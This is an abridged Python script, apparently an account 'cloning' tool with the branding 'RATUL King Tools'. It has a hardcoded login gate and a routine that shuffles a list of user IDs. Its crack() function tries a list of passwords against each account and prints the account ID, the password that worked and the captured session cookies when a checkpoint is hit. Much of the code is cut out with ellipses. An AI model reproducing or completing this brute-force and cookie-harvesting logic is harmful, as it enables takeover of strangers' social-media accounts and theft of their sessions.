...
while attemps < 12345677901:
    ...
    if username == 'RATUL' and password == '3.7v':
        print(' \033[0;92mLogin successfull Bro.')
        os.system('espeak -a 300 " Login successfully"')
        os.system('espeak -a 300 " Welcome To Ratul King Tools Update Version 3.7v Cloning"')
        break
    else:
...
def setting():
	...
	if hu in ['1','01']:
		...
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	print('\x1b[1;92m ACTIVE FILE\n\x1b[1;97m [1] METHOD Fuck.. ')
	os.system('espeak -a 300 "  method,  Fuck"')
	hc = input(' CHOOSE: ')
	if hc in ['1','01']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[RATUL] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#MAMA-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•RATUL-Cp] {idf} • {pw}\n\033[0;93[🤟]= COOKIES• \033[0;92m{kuki} ')     
